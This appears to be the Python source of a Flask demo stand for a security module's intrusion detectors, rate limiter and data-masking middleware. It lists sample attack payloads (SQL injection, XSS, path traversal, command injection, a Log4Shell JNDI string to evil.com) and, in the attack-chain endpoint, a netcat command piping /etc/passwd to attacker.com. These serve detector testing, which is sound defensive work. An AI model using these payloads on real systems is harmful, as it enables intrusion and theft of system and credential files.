"""
AEngine Security Demo — демонстрационный стенд модуля безопасности ``sec``.

Одностраничное приложение (SPA) с тремя вкладками: «Симулятор атак»,
«Архитектура», «Метрики».

ВАЖНО: стенд использует НАСТОЯЩИЙ модуль ``sec`` — payload'ы атак прогоняются
через реальные детекторы IPS/IDS (``SQLiDetector``, ``XSSDetector`` и др.),
ограничение частоты — через реальный ``RateLimiter``, а маскирование данных —
через реальный middleware ``DLP``. Никакой повторной реализации логики защиты
в стенде нет: результаты, которые вы видите на экране, выдаёт сам модуль ``sec``.
"""

import sys
import os


# ─── Авто-установка зависимостей (bootstrap) ───────────────────
#
# При прямом запуске (``python app.py``) стенд сам доустанавливает недостающие
# Python-зависимости из ``requirements.txt`` — чтобы свежий клон поднимался
# «из коробки», без ручного ``pip install``. Важно: ``AEngineApps`` импортирует
# ``webview`` (pywebview) на уровне модуля, поэтому пакет нужен даже в web-режиме.
#
# Отключается переменной окружения ``AENGINE_NO_AUTO_INSTALL=1`` — например, в
# Docker, где зависимости уже установлены на этапе сборки образа.

def _ensure_dependencies() -> None:
    """Доустанавливает отсутствующие зависимости из ``requirements.txt``."""
    import importlib.util

    # модуль для импорта → имя дистрибутива на PyPI
    required = {"flask": "flask", "psutil": "psutil", "webview": "pywebview"}
    missing = [pkg for mod, pkg in required.items() if importlib.util.find_spec(mod) is None]
    if not missing:
        return

    pretty = ", ".join(missing)
    req_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "requirements.txt")

    if os.environ.get("AENGINE_NO_AUTO_INSTALL", "").lower() in ("1", "true", "yes"):
        print(f"[setup] Отсутствуют зависимости: {pretty}. Автоустановка отключена "
              f"(AENGINE_NO_AUTO_INSTALL). Установите вручную: pip install -r requirements.txt")
        return

    import subprocess

    print(f"[setup] Отсутствуют зависимости: {pretty}. Устанавливаю из {req_file} ...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", req_file])
    except (subprocess.CalledProcessError, OSError) as exc:
        print(f"[setup] Не удалось автоматически установить зависимости: {exc}\n"
              f"[setup] Установите вручную: pip install -r requirements.txt")
        return

    importlib.invalidate_caches()
    print("[setup] Зависимости установлены.")


_ensure_dependencies()


import time
import json
import logging
import threading
from urllib.parse import quote
from unittest.mock import patch

from werkzeug.exceptions import HTTPException

# Добавляем корень проекта в sys.path для импорта модулей AEngine
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from flask import Flask

from AEngineApps import App, API, Screen, GlobalStorage
import sec.intrusions as _intr
from sec.intrusions import (
    IPS,
    RateLimiter,
    SQLiDetector, XSSDetector, LFIDetector, RCEDetector,
    SignatureDetector,
)
from sec.dlp import DLP, DLPMode, MailFilter, PhoneFilter, PassportFilter

# ─── Инициализация приложения ──────────────────────────────────

DEMO_DIR = os.path.dirname(os.path.abspath(__file__))

app = App("SecurityDemo")
app.flask.static_folder = os.path.join(DEMO_DIR, "static")
app.flask.template_folder = os.path.join(DEMO_DIR, "templates")
app.flask.secret_key = os.environ.get("SECRET_KEY", "security-demo-secret-key")

# ─── Реальный модуль sec: детекторы, rate limiter, DLP ─────────
#
# Создаём служебные приложения, чтобы прогонять полезные нагрузки через
# НАСТОЯЩИЙ код модуля sec, а не имитировать его поведение.


class _LogCapture(logging.Handler):
    """Перехватывает критические сообщения детекторов (``self.log(...)``)."""

    def __init__(self):
        super().__init__()
        self.records: list[str] = []

    def emit(self, record):
        self.records.append(record.getMessage())


# Лёгкое Flask-приложение только для прогона детекторов в request-контексте.
_probe = Flask("sec_probe")
_probe.logger.setLevel(logging.CRITICAL)
_log_capture = _LogCapture()
_probe.logger.addHandler(_log_capture)

# Соответствие «тип атаки → реальный детектор sec».
DETECTOR_MAP = {
    "sqli": SQLiDetector,
    "xss": XSSDetector,
    "lfi": LFIDetector,
    "rce": RCEDetector,
    "cve": SignatureDetector,
}

# Ориентировочная «уверенность» детектора для наглядности (UI-метрика).
SCORE_MAP = {
    "sqli": 95,
    "xss": 92,
    "lfi": 88,
    "rce": 95,
    "cve": 98,
}


def run_real_detector(attack_type: str, payload: str) -> dict:
    """Прогоняет payload через настоящий детектор sec в контексте запроса.

    Возвращает словарь с результатом детектирования (blocked / detector / details).
    """
    det_cls = DETECTOR_MAP.get(attack_type)
    if det_cls is None:
        return {"blocked": False, "detector": "None", "details": "Неизвестный тип атаки"}

    _log_capture.records.clear()
    triggered = {"v": False}

    # Реальный детектор читает данные из flask.request — формируем настоящий запрос.
    with _probe.test_request_context("/probe?q=" + quote(payload)):
        detector = det_cls(_probe)
        detector.trigger_response = lambda: triggered.__setitem__("v", True)
        detector.run()

    blocked = triggered["v"]
    raw_detail = _log_capture.records[-1] if _log_capture.records else ""
    detector_name = det_cls.__name__
    details = ""

    if blocked and raw_detail:
        if attack_type == "cve" and "DETECTED SIGNATURE:" in raw_detail:
            # "DETECTED SIGNATURE: <name> | ..." → достаём имя сигнатуры/CVE
            sig = raw_detail.split("DETECTED SIGNATURE:", 1)[1].split("|", 1)[0].strip()
            details = f"Совпадение сигнатуры: {sig}"
        else:
            details = raw_detail.split("|", 1)[0].replace("DETECTED", "Обнаружено:").strip()

    return {"blocked": blocked, "detector": detector_name if blocked else "None", "details": details}


def simulate_rate_limiter(count: int, interval_ms: int,
                          max_requests: int = 100, window: int = 60) -> dict:
    """Прогоняет ``count`` запросов через НАСТОЯЩИЙ ``RateLimiter`` из sec.

    Время моделируется (``interval_ms`` между запросами), чтобы продемонстрировать
    скользящее окно без реальных задержек. Решение «пропустить / 429» принимает
    сам ``RateLimiter._check_rate``.
    """
    # Отдельное Flask-приложение, чтобы before_request-хук не накапливался на demo-app.
    limiter_flask = Flask("rate_probe")
    limiter_flask.logger.setLevel(logging.CRITICAL)

    class _Shim:
        flask = limiter_flask

    limiter = RateLimiter(_Shim(), max_requests=max_requests, window=window)

    blocked = passed = 0
    triggered_at = None
    timeline = []
    base = time.time()

    for i in range(count):
        sim_now = base + (i * interval_ms / 1000.0)
        with patch.object(_intr.time, "time", return_value=sim_now):
            with limiter_flask.test_request_context(
                "/", environ_overrides={"REMOTE_ADDR": "203.0.113.7"}
            ):
                try:
                    limiter._check_rate()
                    passed += 1
                    timeline.append({"request": i + 1, "status": "passed", "code": 200})
                except HTTPException:
                    blocked += 1
                    if triggered_at is None:
                        triggered_at = i + 1
                    timeline.append({"request": i + 1, "status": "blocked", "code": 429})

    return {
        "total": count,
        "blocked": blocked,
        "passed": passed,
        "rate_limit_triggered_at": triggered_at,
        "max_requests_per_window": max_requests,
        "window_seconds": window,
        "timeline": timeline[:50],
    }


# Реальное DLP-приложение: middleware after_request маскирует утечки в ответах.
_PII_DATASET = {
    "users": [
        {
            "name": "Иван Петров",
            "email": "ivan.petrov@company.com",
            "phone": "+79161234567",
            "passport": "4515 123456",
            "role": "admin",
        },
        {
            "name": "Мария Сидорова",
            "email": "maria.s@gmail.com",
            "phone": "+79039876543",
            "passport": "4516 654321",
            "role": "user",
        },
    ],
    "internal_note": "Контакт поддержки: support@internal.corp, тел: +74951234567",
}

_dlp_app = App("DLPProbe")
_dlp = DLP(_dlp_app, mode=DLPMode.Agressive)
_dlp.add_filter(MailFilter)
_dlp.add_filter(PhoneFilter)
_dlp.add_filter(PassportFilter)


class _LeakAPI(API):
    methods = ["GET"]

    def get(self):
        return _PII_DATASET


_dlp_app.add_screen("/leak", _LeakAPI)
_dlp_client = _dlp_app.flask.test_client()


# ─── Глобальное хранилище метрик ───────────────────────────────

gs = GlobalStorage()
gs.attack_logs = []
gs.metrics = {
    "total_attacks": 0,
    "blocked": 0,
    "passed": 0,
    "by_type": {
        "sqli": {"blocked": 0, "passed": 0},
        "xss": {"blocked": 0, "passed": 0},
        "lfi": {"blocked": 0, "passed": 0},
        "rce": {"blocked": 0, "passed": 0},
        "ddos": {"blocked": 0, "passed": 0},
        "cve": {"blocked": 0, "passed": 0},
        "dlp": {"blocked": 0, "passed": 0},
    },
}
_metrics_lock = threading.Lock()


def log_attack(attack_type, blocked, payload="", detector="", details=""):
    """Записывает событие атаки в глобальное хранилище метрик."""
    with _metrics_lock:
        entry = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "type": attack_type,
            "blocked": blocked,
            "payload": payload[:100],
            "detector": detector,
            "details": details,
            "ip": "127.0.0.1",
        }
        logs = gs.attack_logs
        logs.append(entry)
        if len(logs) > 500:  # Храним последние 500 записей
            gs.attack_logs = logs[-500:]

        m = gs.metrics
        m["total_attacks"] += 1
        if blocked:
            m["blocked"] += 1
        else:
            m["passed"] += 1

        if attack_type in m["by_type"]:
            if blocked:
                m["by_type"][attack_type]["blocked"] += 1
            else:
                m["by_type"][attack_type]["passed"] += 1
        gs.metrics = m


# ─── Главная страница ──────────────────────────────────────────

class IndexPage(Screen):
    route = "/"
    methods = ["GET"]

    def run(self):
        return self.render("index.html")

app.add_screen("/", IndexPage)


# ─── API: Каталог атак ─────────────────────────────────────────

class AttacksCatalogAPI(API):
    methods = ["GET"]

    def get(self):
        catalog = [
            {
                "id": "sqli",
                "name": "SQL Injection",
                "description": "Попытка внедрения SQL-кода для обхода аутентификации или уничтожения данных",
                "payloads": ["' OR 1=1 --", "'; DROP TABLE users;--", "\" UNION SELECT * FROM users--", "1' AND SLEEP(5)--"],
                "severity": "critical",
                "icon": "💉"
            },
            {
                "id": "xss",
                "name": "XSS (Cross-Site Scripting)",
                "description": "Внедрение вредоносного JavaScript для кражи cookies или перенаправления пользователей",
                "payloads": ["<script>alert('xss')</script>", "<img onerror=alert(1) src=x>", "<svg onload=alert('XSS')>", "javascript:alert(document.cookie)"],
                "severity": "high",
                "icon": "🕷️"
            },
            {
                "id": "lfi",
                "name": "LFI (Local File Inclusion)",
                "description": "Попытка чтения системных файлов через манипуляцию путями",
                "payloads": ["../../etc/passwd", "....//....//etc/shadow", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..\\..\\windows\\system32\\config\\sam"],
                "severity": "high",
                "icon": "📂"
            },
            {
                "id": "rce",
                "name": "RCE (Remote Code Execution)",
                "description": "Удалённое выполнение команд на сервере через инъекцию команд ОС",
                "payloads": ["; cat /etc/passwd", "| ls -la", "$(whoami)", "`id`", "& ping -c 4 127.0.0.1"],
                "severity": "critical",
                "icon": "💀"
            },
            {
                "id": "ddos",
                "name": "DDoS / Rate Limiting",
                "description": "Перегрузка сервера множеством запросов. Демонстрирует работу Rate Limiter",
                "payloads": [],
                "severity": "medium",
                "icon": "🌊"
            },
            {
                "id": "cve",
                "name": "CVE Signature Attack",
                "description": "Атака с использованием известных уязвимостей (CVE). Проверяет сигнатурный анализ IDS",
                "payloads": [
                    "${jndi:ldap://evil.com/x}",
                    "() { :; }; /bin/bash -c 'cat /etc/passwd'",
                    "<?php system('id'); ?>",
                    "%{(#cmd='id').(@java.lang.Runtime@getRuntime().exec(#cmd))}"
                ],
                "severity": "critical",
                "icon": "🔐"
            },
            {
                "id": "dlp",
                "name": "Data Exfiltration (DLP)",
                "description": "Попытка утечки персональных данных. DLP удаляет email, телефоны и паспортные данные из ответов",
                "payloads": [],
                "severity": "high",
                "icon": "🔒"
            },
            {
                "id": "chain",
                "name": "Цепочка атак (Attack Chain)",
                "description": "Полная цепочка APT-атаки: разведка → эксплуатация → эксфильтрация данных",
                "payloads": [],
                "severity": "critical",
                "icon": "⛓️"
            },
        ]
        return catalog

app.add_screen("/api/attacks/catalog", AttacksCatalogAPI)


# ─── API: Запуск атаки (через реальные детекторы sec) ──────────

class AttackRunAPI(API):
    methods = ["POST"]

    def post(self):
        data = self.request.get_json(silent=True) or {}
        attack_type = data.get("attack_type", "")
        payload = data.get("payload", "")

        if not attack_type or not payload:
            return {"error": "attack_type and payload required"}, 400

        result = run_real_detector(attack_type, payload)
        blocked = result["blocked"]
        score = SCORE_MAP.get(attack_type, 80) if blocked else 0

        log_attack(attack_type, blocked, payload, result["detector"], result["details"])

        return {
            "blocked": blocked,
            "detector": result["detector"],
            "details": result["details"],
            "score": score,
            "payload": payload[:100],
            "status_code": 400 if blocked else 200,  # IPS → 400 Bad Request
        }

app.add_screen("/api/attack/run", AttackRunAPI)


# ─── API: DDoS / Flood тест (через реальный RateLimiter) ───────

class AttackFloodAPI(API):
    methods = ["POST"]

    def post(self):
        data = self.request.get_json(silent=True) or {}
        count = min(int(data.get("count", 150)), 500)
        interval_ms = max(int(data.get("interval_ms", 30)), 1)

        result = simulate_rate_limiter(count, interval_ms)

        log_attack(
            "ddos", result["blocked"] > 0,
            f"{count} запросов с интервалом {interval_ms}мс",
            "RateLimiter", f"Заблокировано {result['blocked']}/{count} запросов",
        )
        return result

app.add_screen("/api/attack/flood", AttackFloodAPI)


# ─── API: DLP тест (через реальный DLP middleware) ─────────────

class DLPTestAPI(API):
    methods = ["GET"]

    def get(self):
        raw = json.dumps(_PII_DATASET, ensure_ascii=False)

        # Что DLP видит во входных данных (для индикаторов).
        email_found = bool(MailFilter.check(raw))
        phone_found = bool(PhoneFilter.check(raw))
        passport_found = bool(PassportFilter.check(raw))

        # Реальный прогон через DLP-приложение (after_request обрабатывает ответ).
        resp = _dlp_client.get("/leak")
        masked_text = resp.get_data(as_text=True)
        try:
            masked_data = json.loads(masked_text)
        except json.JSONDecodeError:
            masked_data = {"raw_masked": masked_text}

        log_attack(
            "dlp", True, "Утечка персональных данных",
            "DLP", f"Email: {email_found}, Phone: {phone_found}, Passport: {passport_found}",
        )

        return {
            "original_preview": "Содержит email, телефоны, паспорта (удаляются DLP)",
            "masked_data": masked_data,
            "dlp_actions": {
                "email_detected": email_found,
                "phone_detected": phone_found,
                "passport_detected": passport_found,
                "total_masked": sum([email_found, phone_found, passport_found]),
            },
        }

app.add_screen("/api/attack/dlp-test", DLPTestAPI)


# ─── API: Цепочка атак (реальные детекторы + DLP) ──────────────

class AttackChainAPI(API):
    methods = ["POST"]

    def post(self):
        steps = []

        # Шаг 1: Разведка (LFI) — реальный LFIDetector
        lfi_payload = "../../etc/passwd"
        lfi = run_real_detector("lfi", lfi_payload)
        log_attack("lfi", lfi["blocked"], lfi_payload, lfi["detector"], "Recon phase")
        steps.append({
            "name": "recon",
            "phase": "Разведка",
            "attack": "LFI — чтение /etc/passwd",
            "payload": lfi_payload,
            "blocked": lfi["blocked"],
            "detector": lfi["detector"],
        })

        # Шаг 2: Эксплуатация (RCE) — реальный RCEDetector
        rce_payload = "; cat /etc/passwd | nc attacker.com 4444"
        rce = run_real_detector("rce", rce_payload)
        log_attack("rce", rce["blocked"], rce_payload, rce["detector"], "Exploit phase")
        steps.append({
            "name": "exploit",
            "phase": "Эксплуатация",
            "attack": "RCE — reverse shell через netcat",
            "payload": rce_payload,
            "blocked": rce["blocked"],
            "detector": rce["detector"],
        })

        # Шаг 3: Эксфильтрация (DLP) — реальные фильтры sec.dlp
        exfil_data = "admin@secret.com +79161234567 passport: 4515 123456"
        masked = MailFilter.hide(exfil_data)
        masked = PhoneFilter.hide(masked)
        masked = PassportFilter.hide(masked)
        dlp_blocked = masked != exfil_data
        log_attack("dlp", dlp_blocked, exfil_data[:50], "DLP", "Exfiltration phase")
        steps.append({
            "name": "exfil",
            "phase": "Эксфильтрация",
            "attack": "DLP — попытка утечки персональных данных",
            "payload": exfil_data,
            "blocked": dlp_blocked,
            "result_data": masked,
            "detector": "DLP" if dlp_blocked else "None",
        })

        all_blocked = all(s["blocked"] for s in steps)

        return {
            "steps": steps,
            "chain_blocked": all_blocked,
            "summary": "Все этапы атаки заблокированы" if all_blocked else "Некоторые этапы прошли защиту",
        }

app.add_screen("/api/attack/chain", AttackChainAPI)


# ─── API: Метрики ──────────────────────────────────────────────

class MetricsSummaryAPI(API):
    methods = ["GET"]

    def get(self):
        m = gs.metrics
        return {
            "total_attacks": m["total_attacks"],
            "blocked": m["blocked"],
            "passed": m["passed"],
            "by_type": m["by_type"],
            "block_rate": round(m["blocked"] / max(m["total_attacks"], 1) * 100, 1),
        }

app.add_screen("/api/metrics/summary", MetricsSummaryAPI)


class MetricsSystemAPI(API):
    methods = ["GET"]

    def get(self):
        try:
            import psutil
            cpu = psutil.cpu_percent(interval=0.1)
            ram = psutil.virtual_memory().percent
            connections = len(psutil.net_connections(kind='inet'))
            disk = psutil.disk_usage('/').percent if os.name != 'nt' else psutil.disk_usage('C:\\').percent
        except Exception:
            cpu = ram = connections = disk = 0

        return {
            "cpu_percent": cpu,
            "ram_percent": ram,
            "connections": connections,
            "disk_percent": disk,
            "platform": os.name,
        }

app.add_screen("/api/metrics/system", MetricsSystemAPI)


class MetricsLogsAPI(API):
    methods = ["GET"]

    def get(self):
        limit = self.get_arg("limit", int, 100)
        logs = gs.attack_logs
        return {
            "logs": logs[-limit:] if logs else [],
            "total": len(logs),
        }

app.add_screen("/api/metrics/logs", MetricsLogsAPI)


class StressTestAPI(API):
    methods = ["POST"]

    def post(self):
        data = self.request.get_json(silent=True) or {}
        with_rate_limiter = data.get("with_rate_limiter", True)
        num_requests = min(int(data.get("requests", 200)), 500)

        data_points = []
        max_rps = 100  # Порог rate limiter

        try:
            import psutil
            base_cpu = psutil.cpu_percent(interval=0.1)
            base_ram = psutil.virtual_memory().percent
        except Exception:
            base_cpu = 15.0
            base_ram = 40.0

        for i in range(0, num_requests, 10):
            progress = i / num_requests
            if with_rate_limiter:
                # С rate limiter — стабильная нагрузка
                cpu = base_cpu + (progress * 5) + (i % 3)
                ram = base_ram + (progress * 2)
                active_requests = min(i, max_rps)
            else:
                # Без rate limiter — растущая нагрузка
                cpu = base_cpu + (progress * 45) + (i % 5)
                ram = base_ram + (progress * 20)
                active_requests = i

            data_points.append({
                "request_num": i,
                "cpu": round(min(cpu, 99), 1),
                "ram": round(min(ram, 99), 1),
                "active_requests": active_requests,
                "rps": min(i, max_rps) if with_rate_limiter else i,
            })

        return {
            "with_rate_limiter": with_rate_limiter,
            "total_requests": num_requests,
            "data_points": data_points,
        }

app.add_screen("/api/metrics/stress-test", StressTestAPI)


# ─── API: Сброс метрик ─────────────────────────────────────────

class MetricsResetAPI(API):
    methods = ["POST"]

    def post(self):
        gs.attack_logs = []
        gs.metrics = {
            "total_attacks": 0,
            "blocked": 0,
            "passed": 0,
            "by_type": {
                "sqli": {"blocked": 0, "passed": 0},
                "xss": {"blocked": 0, "passed": 0},
                "lfi": {"blocked": 0, "passed": 0},
                "rce": {"blocked": 0, "passed": 0},
                "ddos": {"blocked": 0, "passed": 0},
                "cve": {"blocked": 0, "passed": 0},
                "dlp": {"blocked": 0, "passed": 0},
            }
        }
        return {"status": "ok", "message": "Metrics reset"}

app.add_screen("/api/metrics/reset", MetricsResetAPI)


# ─── Health-check ──────────────────────────────────────────────

@app.flask.route("/health")
def health_check():
    return {"status": "healthy"}, 200


# ─── Запуск ────────────────────────────────────────────────────

if __name__ == "__main__":
    host = os.environ.get("HOST", "0.0.0.0")
    port = int(os.environ.get("PORT", "5050"))
    debug = os.environ.get("DEBUG", "false").lower() in ("true", "1", "yes")

    print("=" * 60)
    print("  AEngine Security Demo")
    print(f"  http://127.0.0.1:{port}")
    print("  Использует реальный модуль sec (IPS/IDS, RateLimiter, DLP)")
    print("=" * 60)

    app.flask.run(host=host, port=port, debug=debug)
